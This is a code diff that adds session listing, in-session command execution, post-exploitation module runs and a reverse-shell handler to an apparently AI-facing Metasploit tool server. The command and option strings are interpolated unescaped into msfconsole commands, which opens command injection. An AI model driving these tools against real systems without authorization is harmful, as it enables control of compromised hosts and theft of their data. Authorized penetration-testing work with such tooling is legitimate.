@@ -192,6 +192,97 @@ class MetasploitServer(BaseMCPServer):
             handler=self.exec_command,
         )
 
+        self.register_method(
+            name="list_sessions",
+            description="List active Meterpreter/shell sessions",
+            params={
+                "timeout": {
+                    "type": "integer",
+                    "default": 30,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.list_sessions,
+        )
+
+        self.register_method(
+            name="session_command",
+            description="Run a command in an active session",
+            params={
+                "session_id": {
+                    "type": "integer",
+                    "required": True,
+                    "description": "Session ID to interact with",
+                },
+                "command": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Command to execute in the session",
+                },
+                "timeout": {
+                    "type": "integer",
+                    "default": 60,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.session_command,
+        )
+
+        self.register_method(
+            name="post_module",
+            description="Run a post-exploitation module on a session",
+            params={
+                "module": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Post module path (e.g., 'post/multi/gather/env')",
+                },
+                "session_id": {
+                    "type": "integer",
+                    "required": True,
+                    "description": "Session ID to run the module on",
+                },
+                "options": {
+                    "type": "object",
+                    "description": "Additional module options",
+                },
+                "timeout": {
+                    "type": "integer",
+                    "default": 120,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.post_module,
+        )
+
+        self.register_method(
+            name="handler",
+            description="Start a multi/handler to catch reverse shells",
+            params={
+                "payload": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Payload to listen for (e.g., 'windows_reverse_tcp')",
+                },
+                "lhost": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Listening host IP",
+                },
+                "lport": {
+                    "type": "integer",
+                    "required": True,
+                    "description": "Listening port",
+                },
+                "timeout": {
+                    "type": "integer",
+                    "default": 300,
+                    "description": "Timeout waiting for connection (seconds)",
+                },
+            },
+            handler=self.start_handler,
+        )
+
     def _resolve_payload(self, payload: str) -> str:
         """Resolve payload shortcut to full name."""
         return self.COMMON_PAYLOADS.get(payload, payload)
@@ -511,6 +602,193 @@ class MetasploitServer(BaseMCPServer):
                     "command": command,
                     "exploit_success": exploit_success,
                     "command_output": command_output.strip() if command_output else None,
+                },
+                raw_output=sanitize_output(output),
+            )
+
+        except ToolError as e:
+            return ToolResult(
+                success=False,
+                data={},
+                error=str(e),
+            )
+
+    async def list_sessions(
+        self,
+        timeout: int = 30,
+    ) -> ToolResult:
+        """List active Meterpreter/shell sessions."""
+        self.logger.info("Listing active sessions")
+
+        args = [
+            "msfconsole",
+            "-q",
+            "-x", "sessions -l; exit",
+        ]
+
+        try:
+            result = await self.run_command(args, timeout=timeout)
+            output = result.stdout
+
+            # Parse session list
+            sessions = []
+            for line in output.split("\n"):
+                # Match lines like: "  1     meterpreter x86/windows  user@host  192.168.1.1:4444 -> ..."
+                match = re.match(r"\s*(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)", line)
+                if match:
+                    sessions.append({
+                        "id": int(match.group(1)),
+                        "type": match.group(2),
+                        "info": match.group(3),
+                        "user": match.group(4),
+                        "connection": match.group(5),
+                    })
+
+            return ToolResult(
+                success=True,
+                data={
+                    "sessions": sessions,
+                    "count": len(sessions),
+                },
+                raw_output=sanitize_output(output),
+            )
+
+        except ToolError as e:
+            return ToolResult(
+                success=False,
+                data={},
+                error=str(e),
+            )
+
+    async def session_command(
+        self,
+        session_id: int,
+        command: str,
+        timeout: int = 60,
+    ) -> ToolResult:
+        """Run a command in an active session."""
+        self.logger.info(f"Running command in session {session_id}: {command}")
+
+        # Use sessions -C to run command in a session
+        args = [
+            "msfconsole",
+            "-q",
+            "-x", f"sessions -C '{command}' -i {session_id}; exit",
+        ]
+
+        try:
+            result = await self.run_command(args, timeout=timeout)
+            output = result.stdout + result.stderr
+
+            return ToolResult(
+                success=True,
+                data={
+                    "session_id": session_id,
+                    "command": command,
+                },
+                raw_output=sanitize_output(output),
+            )
+
+        except ToolError as e:
+            return ToolResult(
+                success=False,
+                data={},
+                error=str(e),
+            )
+
+    async def post_module(
+        self,
+        module: str,
+        session_id: int,
+        options: Optional[Dict[str, Any]] = None,
+        timeout: int = 120,
+    ) -> ToolResult:
+        """Run a post-exploitation module on a session."""
+        self.logger.info(f"Running post module {module} on session {session_id}")
+
+        commands = [
+            f"use {module}",
+            f"set SESSION {session_id}",
+        ]
+
+        if options:
+            for key, value in options.items():
+                commands.append(f"set {key} {value}")
+
+        commands.extend(["run", "exit"])
+
+        args = [
+            "msfconsole",
+            "-q",
+            "-x", "; ".join(commands),
+        ]
+
+        try:
+            result = await self.run_command(args, timeout=timeout)
+            output = result.stdout + result.stderr
+
+            return ToolResult(
+                success=True,
+                data={
+                    "module": module,
+                    "session_id": session_id,
+                },
+                raw_output=sanitize_output(output),
+            )
+
+        except ToolError as e:
+            return ToolResult(
+                success=False,
+                data={},
+                error=str(e),
+            )
+
+    async def start_handler(
+        self,
+        payload: str,
+        lhost: str,
+        lport: int,
+        timeout: int = 300,
+    ) -> ToolResult:
+        """Start a multi/handler to catch reverse shells."""
+        self.logger.info(f"Starting handler for {payload} on {lhost}:{lport}")
+
+        payload_name = self._resolve_payload(payload)
+
+        commands = [
+            "use exploit/multi/handler",
+            f"set PAYLOAD {payload_name}",
+            f"set LHOST {lhost}",
+            f"set LPORT {lport}",
+            "set ExitOnSession false",
+            "exploit -j",
+        ]
+
+        # Run handler and wait a bit for it to start
+        commands.append("sleep 2")
+        commands.append("jobs")
+        commands.append("exit")
+
+        args = [
+            "msfconsole",
+            "-q",
+            "-x", "; ".join(commands),
+        ]
+
+        try:
+            result = await self.run_command(args, timeout=timeout)
+            output = result.stdout + result.stderr
+
+            # Check if handler started
+            handler_started = "handler" in output.lower() and "started" in output.lower()
+
+            return ToolResult(
+                success=True,
+                data={
+                    "payload": payload_name,
+                    "lhost": lhost,
+                    "lport": lport,
+                    "handler_started": handler_started,
                 },
                 raw_output=sanitize_output(output),
             )
